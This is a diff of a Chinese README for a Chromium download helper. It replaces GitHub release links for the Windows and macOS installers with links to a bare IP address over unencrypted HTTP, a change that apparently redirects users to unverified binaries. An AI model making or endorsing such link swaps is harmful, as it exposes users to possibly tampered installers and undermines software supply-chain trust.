@@ -15,9 +15,9 @@ Chromium的更新速度很快，每隔數小時即有新的開發版本發佈，
 
 JJQQKK安装器能加速下载最新版Chromium，推荐所有用户使用JJQQKK安装器。支持Windows和macOS。
 
-[Windows安装包](https://github.com/jjqqkk/chromium/releases/download/75.0.3770.15/JJQQKK-1.0.0.msi)
+[Windows安装包](http://167.99.163.129/JJQQKK-1.0.0.msi)
 
-[macOS安装包](https://github.com/jjqqkk/chromium/releases/download/75.0.3770.15/JJQQKK-1.0.0.pkg)
+[macOS安装包](http://167.99.163.129/JJQQKK-1.0.0.pkg)
 
 ### 使用方法
 
